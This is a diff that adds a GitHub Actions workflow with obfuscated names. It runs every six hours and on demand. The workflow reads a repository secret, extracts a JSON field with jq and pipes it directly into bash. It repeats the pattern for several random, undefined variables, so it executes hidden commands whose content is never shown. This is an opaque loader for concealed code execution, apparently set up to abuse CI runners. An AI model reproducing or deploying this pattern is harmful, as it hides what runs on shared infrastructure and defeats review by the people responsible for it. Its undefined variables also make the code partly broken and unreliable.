@@ -1,0 +1,27 @@
+name: ganjueshiy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ganjueshiy
+        env:
+          bjr9: ${{ secrets.bjr9 }}
+        run: |
+          echo $bjr9 | jq -r .xy94 | /bin/bash
+          echo $ldgx1430 | jq -r .jpsir18171 | /bin/bash
+          echo $t2 | jq -r .heocn074 | /bin/bash
+          echo $xrt14239 | jq -r .o9 | /bin/bash
+          echo $ina4495 | jq -r .j26 | /bin/bash
+          echo $i8 | jq -r .iunqv3 | /bin/bash
+          echo $u77 | jq -r .d1 | /bin/bash
+          echo $eht48 | jq -r .oznml59968 | /bin/bash
+          echo $ge4139 | jq -r .n3 | /bin/bash
+
